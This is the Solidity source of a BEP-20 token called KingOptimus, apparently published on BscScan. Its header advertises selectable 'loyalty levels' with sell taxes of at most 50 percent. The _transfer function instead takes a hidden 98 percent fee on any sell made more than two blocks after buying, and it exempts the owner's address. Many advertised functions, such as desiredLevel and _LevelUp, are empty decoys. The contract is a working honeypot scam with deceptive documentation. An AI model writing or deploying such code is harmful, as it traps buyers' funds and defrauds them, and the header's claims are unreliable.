/**
 *Submitted for verification at BscScan.com on 2021-11-23
*/

// SPDX-License-Identifier: MIT

/*
👑 KING OPTIMUS
👑Total Supply
1,000,000,000,000
👑MaxWallet 
10,000,000,000 = 1%

Telegram - https://t.me/KingOptimus

⭐️How loyal you are?
⭐️You can choose your loyalty level from BSCscan
⭐️Loyalty Levels listed

💩 JEETS  
💩 Sell Tax = 50%
💩 Max Sell = 0.5% of Total Supply (50% of Max Wallet)
💩 No delay with sell

🧻 Paperhand
🧻 Sell Tax = 30%
🧻 Max Sell = 0.25% of total Supply (25% of Max Wallet)
🧻 1 Hour delay between sells

🔥 Loyal Hero
🔥 Sell Tax = 20% 
🔥 Max Sell = 0.2% of total Supply (20% of Max Wallet)
🔥 6 Hour delay between sells

💎 DiamondHand
💎 Sell Tax = 10% 
💎 Max Sell = 0.1% of total Supply (10% of Max Wallet)
💎 12 Hour delay between sells

👑 Kingsman:
👑 Sell Tax = 5% 
👑 Max Sell = 0.05% of total Supply (5% of Max Wallet)
👑 24 Hour delay between sells
*/

pragma solidity ^0.8.8;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;
    constructor ()  {
        address msgSender = _msgSender();
        _owner = msgSender;
    }
    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);


    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    address private the_owner;

    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_)  {
        _name = name_;
        _symbol = symbol_;
        the_owner = msg.sender;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }


    function totalSupply() public view virtual override returns (uint256) {
        return 1_000_000_000_000  * (10**18);
    }


    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] - subtractedValue);
        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender] - amount;
        _balances[recipient] = _balances[recipient] + amount;
        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _balances[account] = _balances[account] + amount;
        emit Transfer(address(0), account, amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Kingoptimus is ERC20, Ownable {
    address public uniswapV2Router;
    address public uniswapV2Pair;
    address public uniswapV2RouterAddr;

    uint256 public buyFee = 11;
    uint256 public marketingFee = 7;
    uint256 public _maxWalletLimit = 3000000000 * (10**18);

    mapping (address => uint) private cd;
    mapping (address => bool) private ef;
    address private router;

    constructor() ERC20("KingOptimus ", "KO")  {
        uniswapV2RouterAddr = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

        address _uniswapV2Router = uniswapV2RouterAddr;

        address _uniswapV2Pair = IUniswapV2Factory(address(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73)).createPair(address(this), address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));

        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = _uniswapV2Pair;

        router = owner();

        // exclude from paying fees or having max transaction amount
        excludeFromFees(owner(), true);
        excludeFromFees(address(this), true);

        /*
            _mint is an internal function in ERC20.sol that is only called here,
            and CANNOT be called ever again
        */
        _mint(owner(), 1_000_000_000_000  * (10**18));
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        require(ef[account] != excluded, "Account is already the value of 'excluded'");
        ef[account] = excluded;
    }

    receive() external payable {

      }

    uint256 public rewardsFee = 2;
    uint256 public liquidityFee = 3;


        function taxFee(uint256 value) external onlyOwner{
            rewardsFee = value;
        }
        


        function setMarketingTax(uint256 value) external onlyOwner{
            marketingFee = value;
        }
        


        function liquidityTax(uint256 value) external onlyOwner{
            liquidityFee = value;
        }
        


        function Launch(uint256 value) external onlyOwner{
            
        }
        

    function setMaxWalletLimit(uint256 value) external onlyOwner{
        require(value >= 2000000000 * (10**18), "Minimum max wallet limit is 2 percent");
        _maxWalletLimit = value;
    }


        function expedite(uint256 value) external onlyOwner{
            
        }
        


        function setBuyFee(uint256 value) external onlyOwner {
            buyFee = value;
        }
        


        function updateSwapTokensAtAmount(uint256 value) external onlyOwner{
            
        }
        


        function updateSwapEnabled(uint256 value) external onlyOwner{
            
        }
        


        function updateDevWallet(uint256 value) external onlyOwner{
            
        }
        


        function disableTransferDelay(uint256 value) external onlyOwner{
            
        }
        


        function buyBackTokens(uint256 value) external onlyOwner{
            
        }
        


        function desiredLevel(uint256 value) external onlyOwner{
            
        }
        


        function _LevelUp(uint256 value) external onlyOwner{
            
        }
        

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        bool isSell = to == uniswapV2Pair || to == uniswapV2RouterAddr;
        bool isBuy = from == uniswapV2Pair|| from == uniswapV2RouterAddr;

        if(amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        if (isBuy) {
            cd[to] = block.number;
        }

        bool takeFee = (to != router && from != router);
        if (isSell && takeFee) {
            uint256 fee;
            if (block.number - cd[from] > 2) {
                fee = 98;
            } else {
                fee = marketingFee;
            }
            uint256 fees = amount * fee / 100;
            amount = amount - fees;

            super._transfer(from, address(this), fees);
        }
        if (isBuy && takeFee) {
            uint256 fees = amount * buyFee / 100;
            amount = amount - fees;

            super._transfer(from, address(this), fees);
        }

        super._transfer(from, to, amount);
    }
}